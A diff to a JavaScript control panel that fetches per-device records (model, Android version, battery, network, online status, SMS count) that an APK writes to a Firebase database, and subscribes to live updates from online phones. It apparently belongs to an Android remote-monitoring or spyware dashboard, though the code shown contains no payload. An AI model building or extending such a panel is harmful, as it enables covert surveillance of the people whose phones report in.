@@ -555,33 +555,102 @@ function openPanel(){
   fetchClientsFast();
 }
 
-// ═══ FAST FETCH — REST parallel + SDK once (sub-1s target) ═══
+// ═══ FAST FETCH — real data lives under /devices (clients & devices_status often empty) ═══
 function fetchClientsFast(){
-  var done=function(raw,source){
-    if(!raw||typeof raw!=='object') return;
+  var done=function(raw){
+    if(!raw||typeof raw!=='object'||!Object.keys(raw).length) return;
     clientsRawMap=mergeClientMaps(clientsRawMap,raw);
-    if(!firstFetchDone){
-      firstFetchDone=true;
-      showFetchMs(Math.round(performance.now()-fetchStartMs));
-    }
+    markFetchDone();
     processClientsData(clientsRawMap,false);
     debouncedSetClientsCache(clientsRawMap);
   };
-  // REST = fastest first paint (single HTTP, no WS handshake wait)
   var restFetch=function(path){
     return fetch(DB_REST+'/'+path+'.json',{cache:'no-store'})
       .then(function(r){return r.json();})
-      .then(function(d){if(d&&typeof d==='object')done(d,path);})
+      .then(function(d){if(d&&typeof d==='object')done(d);})
       .catch(function(){});
   };
+  // Fast summary nodes (if APK writes them)
   restFetch('devices_status');
   restFetch('clients');
-  // SDK once as backup (uses persistence cache if available)
+  // Main source: /devices — shallow IDs then lightweight summary per device
+  fetchDevicesFromRTDB();
   if(DB){
-    DB.ref('devices_status').once('value').then(function(s){if(s.exists())done(s.val(),'sdk_status');});
-    DB.ref('clients').once('value').then(function(s){if(s.exists())done(s.val(),'sdk_clients');});
+    DB.ref('devices_status').once('value').then(function(s){if(s.exists())done(s.val());});
+    DB.ref('clients').once('value').then(function(s){if(s.exists())done(s.val());});
     attachClientsLiveUpdates();
   }
+}
+function markFetchDone(){
+  if(firstFetchDone) return;
+  firstFetchDone=true;
+  showFetchMs(Math.round(performance.now()-fetchStartMs));
+}
+function summaryFromParts(id,info,live,online){
+  info=info||{}; live=live||{};
+  var ts=info.last_seen||live.timestamp_millis||0;
+  if(typeof ts==='object') ts=Date.now();
+  var tsAge=(ts>0)?(Date.now()-ts):999999999;
+  var on=(online===true)||(tsAge>0&&tsAge<300000);
+  return{id:id,data:{
+    name:info.device_model||info.name, brand:info.device_brand||info.brand,
+    android:info.android_version||info.android, ts:ts,
+    online:on, battery:live.battery_level||live.battery||0,
+    network:live.network_type||live.network||'?', charging:!!live.is_charging,
+    sms_count:live.total_sms||live.sms_count||0
+  }};
+}
+function fetchOneDeviceSummary(id){
+  var base=DB_REST+'/devices/'+encodeURIComponent(id)+'/';
+  return Promise.all([
+    fetch(base+'device_info.json',{cache:'no-store'}).then(function(r){return r.json();}).catch(function(){return null;}),
+    fetch(base+'live_data.json',{cache:'no-store'}).then(function(r){return r.json();}).catch(function(){return null;})
+  ]).then(function(p){return summaryFromParts(id,p[0],p[1],null);});
+}
+function fetchDevicesFromRTDB(){
+  fetch(DB_REST+'/devices.json?shallow=true',{cache:'no-store'})
+    .then(function(r){return r.json();})
+    .then(function(ids){
+      if(!ids||typeof ids!=='object') return;
+      var keys=Object.keys(ids);
+      if(!keys.length) return;
+      var el=document.getElementById('devList');
+      if(el) el.innerHTML='<div class="dev-empty">⏳ Loading '+keys.length+' devices...</div>';
+      var batchSize=20, idx=0;
+      function nextBatch(){
+        var batch=keys.slice(idx,idx+batchSize);
+        idx+=batchSize;
+        if(el) el.innerHTML='<div class="dev-empty">⏳ '+Math.min(idx,keys.length)+' / '+keys.length+' devices...</div>';
+        if(!batch.length){ attachDeviceLiveListeners(keys); return; }
+        Promise.all(batch.map(fetchOneDeviceSummary)).then(function(rows){
+          rows.forEach(function(row){if(row&&row.id) clientsRawMap[row.id]=row.data;});
+          markFetchDone();
+          processClientsData(clientsRawMap,false);
+          debouncedSetClientsCache(clientsRawMap);
+          nextBatch();
+        }).catch(function(){ nextBatch(); });
+      }
+      nextBatch();
+    })
+    .catch(function(e){ console.error('devices shallow fetch failed',e); });
+}
+var deviceLiveAttached={};
+function attachDeviceLiveListeners(ids){
+  if(!DB) return;
+  var online=ids.filter(function(id){var s=clientsRawMap[id];return s&&(s.online===true||s.status==='online');});
+  var targets=(online.length?online:ids).slice(0,30);
+  targets.forEach(function(id){
+    if(deviceLiveAttached[id]) return;
+    deviceLiveAttached[id]=true;
+    DB.ref('devices/'+id+'/live_data').on('value',function(s){
+      DB.ref('devices/'+id+'/device_info').once('value').then(function(si){
+        var row=summaryFromParts(id,si.val(),s.val(),null);
+        clientsRawMap[id]=row.data;
+        processClientsData(clientsRawMap,false);
+        debouncedSetClientsCache(clientsRawMap);
+      });
+    });
+  });
 }
 
 function mergeClientMaps(a,b){
